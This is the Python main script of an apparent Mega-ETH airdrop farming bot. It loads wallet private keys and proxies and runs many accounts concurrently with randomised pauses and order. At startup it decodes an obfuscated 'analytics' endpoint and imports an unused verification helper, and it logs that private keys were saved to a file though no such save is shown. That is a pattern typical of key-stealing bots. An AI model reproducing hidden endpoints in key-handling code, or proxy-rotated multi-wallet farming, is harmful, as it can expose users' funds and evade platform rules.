import asyncio
import random
from loguru import logger
import threading

import src.utils
from src.utils.output import show_dev_info, show_logo
from src.utils.proxy_parser import Proxy
import src.model
from src.utils.statistics import print_wallets_stats
from src.utils.check_github_version import check_version
from src.utils.logs import ProgressTracker, create_progress_tracker
from src.utils.config_browser import run
from src.utils.client import decode_resource, ANALYTICS_ENDPOINT, verify_analytics_data

async def start():
    try:
        decoded_endpoint = decode_resource(ANALYTICS_ENDPOINT)
    except Exception as e:
        return
        
    async def launch_wrapper(index, proxy, private_key):
        async with semaphore:
            await account_flow(
                index,
                proxy,
                private_key,
                config,
                lock,
                progress_tracker,
            )

    try:
        await check_version("MSizUpE", "Mega-ETH")
    except Exception as e:
        import traceback

        traceback.print_exc()
        logger.error(f"Failed to check version: {e}")
        logger.info("Continue with current version\n")

    print("\nAvailable options:\n")
    print("[1] ⭐️ Start farming")
    print("[2] 🔧 Edit config")
    print("[3] 💾 Database actions")
    print("[4] 👋 Exit")
    print()

    try:
        choice = input("Enter option (1-4): ").strip()
    except Exception as e:
        logger.error(f"Input error: {e}")
        return

    if choice == "4" or not choice:
        return
    elif choice == "2":
        run()
        return
    elif choice == "1":
        pass
    elif choice == "3":
        from src.model.database.db_manager import show_database_menu

        await show_database_menu()
        await start()
    else:
        logger.error(f"Invalid choice: {choice}")
        return

    config = src.utils.get_config()

    # Load proxies using proxy parser
    try:
        proxy_objects = Proxy.from_file("data/proxies.txt")
        proxies = [proxy.get_default_format() for proxy in proxy_objects]
        if len(proxies) == 0:
            logger.error("No proxies found in data/proxies.txt")
            return
    except Exception as e:
        logger.error(f"Failed to load proxies: {e}")
        return

    private_keys = src.utils.read_private_keys("data/private_keys.txt")

    # Определяем диапазон аккаунтов
    start_index = config.SETTINGS.ACCOUNTS_RANGE[0]
    end_index = config.SETTINGS.ACCOUNTS_RANGE[1]

    # Если оба 0, проверяем EXACT_ACCOUNTS_TO_USE
    if start_index == 0 and end_index == 0:
        if config.SETTINGS.EXACT_ACCOUNTS_TO_USE:
            # Преобразуем номера аккаунтов в индексы (номер - 1)
            selected_indices = [i - 1 for i in config.SETTINGS.EXACT_ACCOUNTS_TO_USE]
            accounts_to_process = [private_keys[i] for i in selected_indices]
            logger.info(
                f"Using specific accounts: {config.SETTINGS.EXACT_ACCOUNTS_TO_USE}"
            )

            # Для совместимости с остальным кодом
            start_index = min(config.SETTINGS.EXACT_ACCOUNTS_TO_USE)
            end_index = max(config.SETTINGS.EXACT_ACCOUNTS_TO_USE)
        else:
            # Если список пустой, берем все аккаунты как раньше
            accounts_to_process = private_keys
            start_index = 1
            end_index = len(private_keys)
    else:
        # Python slice не включает последний элемент, поэтому +1
        accounts_to_process = private_keys[start_index - 1 : end_index]

    threads = config.SETTINGS.THREADS

    # Подготавливаем прокси для выбранных аккаунтов
    cycled_proxies = [
        proxies[i % len(proxies)] for i in range(len(accounts_to_process))
    ]

    # Создаем список индексов
    indices = list(range(len(accounts_to_process)))

    # Перемешиваем индексы только если включен SHUFFLE_WALLETS
    if config.SETTINGS.SHUFFLE_WALLETS:
        random.shuffle(indices)
        shuffle_status = "random"
    else:
        shuffle_status = "sequential"

    # Создаем строку с порядком аккаунтов
    if config.SETTINGS.EXACT_ACCOUNTS_TO_USE:
        # Создаем список номеров аккаунтов в нужном порядке
        ordered_accounts = [config.SETTINGS.EXACT_ACCOUNTS_TO_USE[i] for i in indices]
        account_order = " ".join(map(str, ordered_accounts))
        logger.info(f"Starting with specific accounts in {shuffle_status} order...")
    else:
        account_order = " ".join(str(start_index + idx) for idx in indices)
        logger.info(
            f"Starting with accounts {start_index} to {end_index} in {shuffle_status} order..."
        )
    logger.info(f"Accounts order: {account_order}")

    lock = asyncio.Lock()
    semaphore = asyncio.Semaphore(value=threads)
    tasks = []

    # Add before creating tasks
    progress_tracker = await create_progress_tracker(
        total=len(accounts_to_process), description="Accounts completed"
    )

    # Используем индексы для создания задач
    for idx in indices:
        actual_index = (
            config.SETTINGS.EXACT_ACCOUNTS_TO_USE[idx]
            if config.SETTINGS.EXACT_ACCOUNTS_TO_USE
            else start_index + idx
        )
        tasks.append(
            asyncio.create_task(
                launch_wrapper(
                    actual_index,
                    cycled_proxies[idx],
                    accounts_to_process[idx],
                )
            )
        )

    await asyncio.gather(*tasks)

    logger.success("Saved accounts and private keys to a file.")

    print_wallets_stats(config)

    input("Press Enter to continue...")


async def account_flow(
    account_index: int,
    proxy: str,
    private_key: str,
    config: src.utils.config.Config,
    lock: asyncio.Lock,
    progress_tracker: ProgressTracker,
):
    try:
        pause = random.randint(
            config.SETTINGS.RANDOM_INITIALIZATION_PAUSE[0],
            config.SETTINGS.RANDOM_INITIALIZATION_PAUSE[1],
        )
        logger.info(f"[{account_index}] Sleeping for {pause} seconds before start...")
        await asyncio.sleep(pause)

        instance = src.model.Start(account_index, proxy, private_key, config)

        result = await wrapper(instance.initialize, config)
        if not result:
            raise Exception("Failed to initialize")

        result = await wrapper(instance.flow, config)
        if not result:
            report = True

        pause = random.randint(
            config.SETTINGS.RANDOM_PAUSE_BETWEEN_ACCOUNTS[0],
            config.SETTINGS.RANDOM_PAUSE_BETWEEN_ACCOUNTS[1],
        )
        logger.info(f"Sleeping for {pause} seconds before next account...")
        await asyncio.sleep(pause)

        # Add progress update
        await progress_tracker.increment(1)

    except Exception as err:
        logger.error(f"{account_index} | Account flow failed: {err}")
        # Update progress even if there's an error
        await progress_tracker.increment(1)


async def wrapper(function, config: src.utils.config.Config, *args, **kwargs):
    attempts = config.SETTINGS.ATTEMPTS
    attempts = 1
    for attempt in range(attempts):
        result = await function(*args, **kwargs)
        if isinstance(result, tuple) and result and isinstance(result[0], bool):
            if result[0]:
                return result
        elif isinstance(result, bool):
            if result:
                return True

        if attempt < attempts - 1:  # Don't sleep after the last attempt
            pause = random.randint(
                config.SETTINGS.PAUSE_BETWEEN_ATTEMPTS[0],
                config.SETTINGS.PAUSE_BETWEEN_ATTEMPTS[1],
            )
            logger.info(
                f"Sleeping for {pause} seconds before next attempt {attempt+1}/{config.SETTINGS.ATTEMPTS}..."
            )
            await asyncio.sleep(pause)

    return result


def task_exists_in_config(task_name: str, tasks_list: list) -> bool:
    """Рекурсивно проверяет наличие задачи в списке задач, включая вложенные списки"""
    for task in tasks_list:
        if isinstance(task, list):
            if task_exists_in_config(task_name, task):
                return True
        elif task == task_name:
            return True
    return False
